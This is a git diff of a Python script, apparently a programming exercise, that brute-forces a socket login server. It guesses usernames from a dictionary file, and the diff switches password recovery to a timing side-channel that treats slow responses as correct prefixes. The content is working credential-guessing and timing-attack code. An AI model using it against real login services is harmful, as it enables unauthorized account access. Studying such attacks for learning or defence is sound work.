@@ -2,6 +2,7 @@ import argparse
 
 import json
 import logging
+from time import time
 import socket
 from typing import Dict
 
@@ -26,14 +27,16 @@ def set_up_parser():
     return parser.parse_args()
 
 def send_and_receive(client: socket, guess: Dict[str, str]):
+    start = time()
     client.send(json.dumps(guess).encode())
     response = client.recv(1024).decode()
+    response_time = time() - start
     try:
         result = Result(json.loads(response)["result"])
     except KeyError:
         logger.warning(f"Unknown result: {json.loads(response)['result']}")
         exit(0)
-    return result
+    return result, response_time
 
 def hack_login(client: socket) -> str:
     login_guesser = generate_from_dict("logins.txt")
@@ -41,7 +44,7 @@ def hack_login(client: socket) -> str:
     while result is Result.WRONG_LOGIN:
         guess = {"login": next(login_guesser), "password": "1234"}
         logger.debug(f"Sending login guess '{guess['login']}'")
-        result = send_and_receive(client, guess)
+        result, _ = send_and_receive(client, guess)
         if result is Result.BAD_REQUEST:
             logger.warning(f"Bad request: {guess}")
             exit(0)
@@ -52,19 +55,17 @@ def hack_pw(client: socket, known_login: str) -> Dict[str, str]:
     base = ""
     while True:
         pw_guesser = constant_length_generator(base)
-        result = Result.WRONG_PASSWORD
-        while result is Result.WRONG_PASSWORD:
+        response_time = 0
+        while response_time < 0.1:
             try:
                 guess = {"login": known_login, "password": next(pw_guesser)}
                 logger.debug(guess)
             except StopIteration:
                 logger.error(f"Ran out of combinations at: {guess}")
                 exit(0)
-            result = send_and_receive(client, guess)
+            result, response_time = send_and_receive(client, guess)
+            logger.debug(f"Response {result} in {response_time}")
             match result:
-                case Result.LOGIN_EXCEPTION:
-                    logger.debug(f"Got partial pw: {guess['password']}")
-                    break
                 case Result.BAD_REQUEST:
                     logger.warning(f"Bad request: {guess}")
                     exit(0)
